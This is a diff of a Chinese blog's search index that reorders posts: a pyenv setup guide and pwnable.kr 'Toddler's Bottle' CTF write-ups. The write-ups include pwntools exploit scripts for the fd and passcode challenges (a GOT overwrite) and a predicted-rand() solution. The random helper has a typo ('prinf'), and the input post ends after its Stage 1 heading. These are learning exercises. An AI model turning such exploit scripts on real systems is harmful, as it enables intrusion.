@@ -15,6 +15,35 @@
       </categories>
   </entry>
   <entry>
+    <title>用Pyenv安装多版本Python</title>
+    <url>/2021/06/02/others/%E7%94%A8pyenv%E8%A3%85%E5%A4%9A%E7%89%88%E6%9C%ACPython/</url>
+    <content><![CDATA[<h2 id="Windows环境配置">Windows环境配置</h2>
+<p>前提：本机已有Python以及pip</p>
+<p>打开PowerShell，输入以下命令安装</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">pip install pyenv<span class="literal">-win</span> -<span class="literal">-target</span> <span class="variable">$HOME</span>\.pyenv</span><br></pre></td></tr></table></figure>
+<p>安装完成后输入以下命令添加到环境变量</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">System.Environment</span>]::SetEnvironmentVariable(<span class="string">&#x27;PYENV&#x27;</span>,<span class="variable">$env:USERPROFILE</span> + <span class="string">&quot;\.pyenv\pyenv-win\&quot;</span>,<span class="string">&quot;User&quot;</span>)</span><br><span class="line">[<span class="type">System.Environment</span>]::SetEnvironmentVariable(<span class="string">&#x27;path&#x27;</span>, <span class="variable">$HOME</span> + <span class="string">&quot;\.pyenv\pyenv-win\bin;&quot;</span> + <span class="variable">$HOME</span> + <span class="string">&quot;\.pyenv\pyenv-win\shims;&quot;</span> + <span class="variable">$env:Path</span>,<span class="string">&quot;User&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="Pyenv常见使用方法">Pyenv常见使用方法</h2>
+<ul>
+<li><code>pyenv commands</code>：列出pyenv所有的命令</li>
+<li><code>pyenv local [&lt;version&gt;]</code>：无version参数则显示当前使用的版本，有version参数则设置使用的版本。该命令只影响当前目录以及其子目录。</li>
+<li><code>pyenv global [&lt;version&gt;]</code>：无version参数则显示当前使用的版本，有version参数则设置使用的版本。该命令影响全局。</li>
+<li><code>pyenv shell [&lt;version&gt;]</code>：无version参数则显示当前使用的版本，有version参数则设置使用的版本。该命令只影响当前会话。</li>
+<li><code>pyenv install &lt;version&gt;</code>：安装某个版本的Python。</li>
+<li><code>pyenv install -l</code>：列出所有可安装的Python版本。</li>
+<li><code>pyenv uninstall &lt;version&gt;</code>：卸载某个版本的Python。</li>
+<li><code>pyenv version</code>：列出当前正在使用的Python版本以及其文件所在目录。</li>
+<li><code>pyenv versions</code>：列出所有已安装的Python版本以及其文件所在目录。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>others</category>
+      </categories>
+      <tags>
+        <tag>pyenv</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>第1章 计算机系统漫游</title>
     <url>/2021/05/28/csapp/%E7%AC%AC1%E7%AB%A0_%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8/</url>
     <content><![CDATA[<h2 id="程序编译过程">程序编译过程</h2>
@@ -391,35 +420,6 @@
       </tags>
   </entry>
   <entry>
-    <title>用Pyenv安装多版本Python</title>
-    <url>/2021/06/02/others/%E7%94%A8pyenv%E8%A3%85%E5%A4%9A%E7%89%88%E6%9C%ACPython/</url>
-    <content><![CDATA[<h2 id="Windows环境配置">Windows环境配置</h2>
-<p>前提：本机已有Python以及pip</p>
-<p>打开PowerShell，输入以下命令安装</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">pip install pyenv<span class="literal">-win</span> -<span class="literal">-target</span> <span class="variable">$HOME</span>\.pyenv</span><br></pre></td></tr></table></figure>
-<p>安装完成后输入以下命令添加到环境变量</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">System.Environment</span>]::SetEnvironmentVariable(<span class="string">&#x27;PYENV&#x27;</span>,<span class="variable">$env:USERPROFILE</span> + <span class="string">&quot;\.pyenv\pyenv-win\&quot;</span>,<span class="string">&quot;User&quot;</span>)</span><br><span class="line">[<span class="type">System.Environment</span>]::SetEnvironmentVariable(<span class="string">&#x27;path&#x27;</span>, <span class="variable">$HOME</span> + <span class="string">&quot;\.pyenv\pyenv-win\bin;&quot;</span> + <span class="variable">$HOME</span> + <span class="string">&quot;\.pyenv\pyenv-win\shims;&quot;</span> + <span class="variable">$env:Path</span>,<span class="string">&quot;User&quot;</span>)</span><br></pre></td></tr></table></figure>
-<h2 id="Pyenv常见使用方法">Pyenv常见使用方法</h2>
-<ul>
-<li><code>pyenv commands</code>：列出pyenv所有的命令</li>
-<li><code>pyenv local [&lt;version&gt;]</code>：无version参数则显示当前使用的版本，有version参数则设置使用的版本。该命令只影响当前目录以及其子目录。</li>
-<li><code>pyenv global [&lt;version&gt;]</code>：无version参数则显示当前使用的版本，有version参数则设置使用的版本。该命令影响全局。</li>
-<li><code>pyenv shell [&lt;version&gt;]</code>：无version参数则显示当前使用的版本，有version参数则设置使用的版本。该命令只影响当前会话。</li>
-<li><code>pyenv install &lt;version&gt;</code>：安装某个版本的Python。</li>
-<li><code>pyenv install -l</code>：列出所有可安装的Python版本。</li>
-<li><code>pyenv uninstall &lt;version&gt;</code>：卸载某个版本的Python。</li>
-<li><code>pyenv version</code>：列出当前正在使用的Python版本以及其文件所在目录。</li>
-<li><code>pyenv versions</code>：列出所有已安装的Python版本以及其文件所在目录。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>others</category>
-      </categories>
-      <tags>
-        <tag>pyenv</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>bof</title>
     <url>/2021/06/03/pwnable/Toddlers_Bottle/bof/</url>
     <content><![CDATA[<h2 id="原题内容">原题内容</h2>
@@ -467,25 +467,6 @@
       </tags>
   </entry>
   <entry>
-    <title>flag</title>
-    <url>/2021/06/03/pwnable/Toddlers_Bottle/flag/</url>
-    <content><![CDATA[<h2 id="原题内容">原题内容</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Papa brought me a packed present! let&#x27;s open it.</span><br><span class="line"></span><br><span class="line">Download : http://pwnable.kr/bin/flag</span><br><span class="line"></span><br><span class="line">This is reversing task. all you need is binary</span><br></pre></td></tr></table></figure>
-<p>题目附件：<a href="/files/pwnable/toddlers_bottle/flag">点我下载</a></p>
-<h2 id="题目分析">题目分析</h2>
-<p>直接给了一个附件，那就是在文件里找flag或者想办法搞到flag了。</p>
-<p>用ida-64打开flag，发现只有4个函数，Shift + F12找到关键词<code>//upx.sf.net $\n</code>，说明该文件使用upx加壳了，那就先脱壳。这边用UPXShell来进行脱壳。<a href="/files/tools/UPXShell.exe">点我下载UPXShell</a></p>
-<p>脱壳后再打开，Shift + F12先搜索&quot;flag&quot;试试，直接搜到flag。</p>
-]]></content>
-      <categories>
-        <category>pwnable</category>
-      </categories>
-      <tags>
-        <tag>pwnable</tag>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>fd</title>
     <url>/2021/06/03/pwnable/Toddlers_Bottle/fd/</url>
     <content><![CDATA[<h2 id="原题内容">原题内容</h2>
@@ -497,6 +478,45 @@
 <p>很容易可以看出，如果传入的第一个参数值是<code>0x1234</code>的话我们就可以使得fd=0，这样的话read读入的stdin可以由我们自己输入。</p>
 <h2 id="脚本源码">脚本源码</h2>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = ssh(host = <span class="string">&#x27;pwnable.kr&#x27;</span>, user = <span class="string">&#x27;fd&#x27;</span>, password = <span class="string">&#x27;guest&#x27;</span>, port = <span class="number">2222</span>)</span><br><span class="line"></span><br><span class="line">process = s.process([<span class="string">&#x27;./fd&#x27;</span>, <span class="string">&#x27;4660&#x27;</span>])</span><br><span class="line">process.sendline(<span class="string">&#x27;LETMEWIN&#x27;</span>)</span><br><span class="line">process.recvline()</span><br><span class="line">flag = (process.recvline()).decode()</span><br><span class="line"></span><br><span class="line">process.close()</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag))</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>pwnable</category>
+      </categories>
+      <tags>
+        <tag>pwnable</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>input</title>
+    <url>/2021/06/04/pwnable/Toddlers_Bottle/input/</url>
+    <content><![CDATA[<h2 id="原题内容">原题内容</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mom? how can I pass my input to a computer program?</span><br><span class="line"></span><br><span class="line">ssh input2@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+<p>题目附件：<a href="/files/pwnable/toddlers_bottle/input">点我下载</a></p>
+<h2 id="程序源码">程序源码</h2>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to pwnable.kr\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see if you know how to give input to program\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Just give me correct inputs then you will get the flag :)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// argv</span></span><br><span class="line">	<span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;A&#x27;</span>],<span class="string">&quot;\x00&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Stage 1 clear!\n&quot;</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="comment">// stdio</span></span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">	read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Stage 2 clear!\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// env</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>, getenv(<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Stage 3 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// file</span></span><br><span class="line">	FILE* fp = fopen(<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Stage 4 clear!\n&quot;</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="comment">// network</span></span><br><span class="line">	<span class="keyword">int</span> sd, cd;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">	sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;socket error, tell admin\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	saddr.sin_family = AF_INET;</span><br><span class="line">	saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">	saddr.sin_port = htons( atoi(argv[<span class="string">&#x27;C&#x27;</span>]) );</span><br><span class="line">	<span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;bind error, use another port\n&quot;</span>);</span><br><span class="line">    		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	listen(sd, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">	cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line">	<span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;accept error, tell admin\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Stage 5 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// here&#x27;s your flag</span></span><br><span class="line">	system(<span class="string">&quot;/bin/cat flag&quot;</span>);	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="题目分析">题目分析</h2>
+<p>获取flag需要过5关，类似拆炸弹游戏，需要5步才能拆除炸弹。</p>
+<h3 id="Stage-1">Stage 1</h3>
+]]></content>
+      <categories>
+        <category>pwnable</category>
+      </categories>
+      <tags>
+        <tag>pwnable</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>flag</title>
+    <url>/2021/06/03/pwnable/Toddlers_Bottle/flag/</url>
+    <content><![CDATA[<h2 id="原题内容">原题内容</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Papa brought me a packed present! let&#x27;s open it.</span><br><span class="line"></span><br><span class="line">Download : http://pwnable.kr/bin/flag</span><br><span class="line"></span><br><span class="line">This is reversing task. all you need is binary</span><br></pre></td></tr></table></figure>
+<p>题目附件：<a href="/files/pwnable/toddlers_bottle/flag">点我下载</a></p>
+<h2 id="题目分析">题目分析</h2>
+<p>直接给了一个附件，那就是在文件里找flag或者想办法搞到flag了。</p>
+<p>用ida-64打开flag，发现只有4个函数，Shift + F12找到关键词<code>//upx.sf.net $\n</code>，说明该文件使用upx加壳了，那就先脱壳。这边用UPXShell来进行脱壳。<a href="/files/tools/UPXShell.exe">点我下载UPXShell</a></p>
+<p>脱壳后再打开，Shift + F12先搜索&quot;flag&quot;试试，直接搜到flag。</p>
 ]]></content>
       <categories>
         <category>pwnable</category>
@@ -533,6 +553,29 @@
 <p>这边选取<code>printf</code>函数来覆写。</p>
 <h2 id="脚本源码">脚本源码</h2>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">s = ssh(host=&#x27;pwnable.kr&#x27;, user=&#x27;passcode&#x27;, password=&#x27;guest&#x27;, port=2222)</span><br><span class="line">shellcode = b&#x27;a&#x27; * 0x60 + p32(0x0804a000)</span><br><span class="line">process = s.process([&#x27;./passcode&#x27;])</span><br><span class="line">process.sendline(shellcode)</span><br><span class="line">process.sendline(&quot;134514147&quot;)</span><br><span class="line">process.recvuntil(&#x27;passcode1 : &#x27;)</span><br><span class="line"></span><br><span class="line">flag = (process.recvline()).decode()</span><br><span class="line"></span><br><span class="line">print(&quot;Flag: &#123;&#125;&quot;.format(flag))</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>pwnable</category>
+      </categories>
+      <tags>
+        <tag>pwnable</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>random</title>
+    <url>/2021/06/04/pwnable/Toddlers_Bottle/random/</url>
+    <content><![CDATA[<h2 id="原题内容">原题内容</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Daddy, teach me how to use random value in programming!</span><br><span class="line"></span><br><span class="line">ssh random@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+<p>题目附件：<a href="/files/pwnable/toddlers_bottle/random">点我下载</a></p>
+<h2 id="程序源码">程序源码</h2>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">	random = rand();	<span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Good!\n&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Wrong, maybe you should try 2^32 cases.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="题目分析">题目分析</h2>
+<p>程序取出随机数random，然后和输入的key异或，若结果等于0xdeadbeef，那么就输出flag。</p>
+<p>仔细观察，发现没有设置随机数种子，那么就是伪随机。</p>
+<p>在自己的linux机子或者在pwnable.kr服务器上写一个random.c，代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">	random = rand();</span><br><span class="line">	prinf(<span class="string">&quot;%u\n&quot;</span>, random ^ <span class="number">0xdeadbeef</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译后运行得到key的值为<code>3039230856</code>。</p>
 ]]></content>
       <categories>
         <category>pwnable</category>
